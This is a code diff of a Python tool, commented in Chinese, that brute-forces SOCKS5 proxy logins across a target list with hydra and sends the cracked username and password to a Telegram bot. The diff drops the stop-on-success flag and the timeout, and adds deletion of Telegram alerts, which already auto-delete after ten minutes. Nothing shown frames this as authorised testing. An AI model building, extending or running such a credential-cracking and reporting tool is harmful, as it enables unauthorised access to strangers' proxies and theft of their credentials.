@@ -93,36 +93,41 @@ def send_telegram(message, auto_delete=False):
         resp = requests.post(url, data=data, timeout=5)
         resp.raise_for_status()
         
-        # 如果需要自动删除，返回message_id
-        if auto_delete:
-            result = resp.json()
-            message_id = result.get('result', {}).get('message_id')
-            if message_id:
-                # 10分钟后删除
-                import threading
-                def delete_message():
-                    time.sleep(600)  # 10分钟 = 600秒
-                    delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
-                    delete_data = {
-                        "chat_id": TG_CHAT_ID,
-                        "message_id": message_id
-                    }
-                    try:
-                        requests.post(delete_url, data=delete_data, timeout=5)
-                    except:
-                        pass
-                
-                # 启动删除线程
-                threading.Thread(target=delete_message, daemon=True).start()
-                return message_id
-        
-        return None
+        result = resp.json()
+        message_id = result.get('result', {}).get('message_id')
+        if auto_delete and message_id:
+            # 10分钟后删除
+            import threading
+
+            def delete_message():
+                time.sleep(600)  # 10分钟 = 600秒
+                delete_telegram_message(message_id)
+
+            # 启动删除线程
+            threading.Thread(target=delete_message, daemon=True).start()
+
+        return message_id
         
     except requests.RequestException as e:
         print(f"Telegram发送失败: {e}")
         return None
     except KeyboardInterrupt:
         raise
+
+
+def delete_telegram_message(message_id):
+    """删除Telegram消息"""
+    if not TG_BOT_TOKEN or not TG_CHAT_ID or not message_id:
+        return
+    delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
+    delete_data = {
+        "chat_id": TG_CHAT_ID,
+        "message_id": message_id
+    }
+    try:
+        requests.post(delete_url, data=delete_data, timeout=5)
+    except requests.RequestException:
+        pass
 
 
 def send_periodic_report(current, total):
@@ -361,18 +366,16 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
         "-s", port,
         "-t", "4",
         "-w", "1",
-        "-f",  # 找到后立即停止
         "-I",  # 忽略已有会话
         f"socks5://{ip}"
     ]
     
+    pending_message_id = None
     try:
-        # 设置超时避免卡死
         res = subprocess.run(
             cmd,
             capture_output=True,
-            text=True,
-            timeout=120
+            text=True
         )
         
         # 检查是否真的找到有效密码
@@ -398,18 +401,16 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                             f"状态：等待二次验证...\n"
                             f"<i>💡 此消息10分钟后自动删除</i>"
                         )
-                        send_telegram(tg_msg, auto_delete=True)
+                        pending_message_id = send_telegram(tg_msg, auto_delete=True)
                     
-                    return user, pwd, "Success"
+                    return user, pwd, "Success", pending_message_id
         
-        return None, None, "未找到"
+        return None, None, "未找到", pending_message_id
         
-    except subprocess.TimeoutExpired:
-        return None, None, "超时"
     except FileNotFoundError:
-        return None, None, "Hydra未安装"
+        return None, None, "Hydra未安装", pending_message_id
     except Exception as e:
-        return None, None, str(e)[:50]
+        return None, None, str(e)[:50], pending_message_id
 
 
 def validate_config():
@@ -483,14 +484,20 @@ def main():
         
         ip, port = target.split(":", 1)
         user, pwd = None, None
+        pending_message_id = None
         
         # ========== 第一步: 无密检测 ==========
         is_no_auth = check_no_auth(ip, port, log_prefix=progress_str)
         
         # ========== 第二步: 如果需要密码，尝试爆破 ==========
         if not is_no_auth:
-            user, pwd, reason = run_hydra(ip, port, log_prefix=progress_str, 
-                                         current=current_num, total=total)
+            user, pwd, reason, pending_message_id = run_hydra(
+                ip,
+                port,
+                log_prefix=progress_str,
+                current=current_num,
+                total=total
+            )
             
             if not user or not pwd:
                 update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} ({reason})")
@@ -502,6 +509,8 @@ def main():
             update_status(f"{progress_str} 正在二次验证: {user}:{pwd} ...")
             if not verify_login(ip, port, user, pwd, log_prefix=progress_str):
                 update_status(f"⚠️  {progress_str} 二次验证失败: {ip}:{port}")
+                if pending_message_id:
+                    delete_telegram_message(pending_message_id)
                 time.sleep(1)
                 continue
         
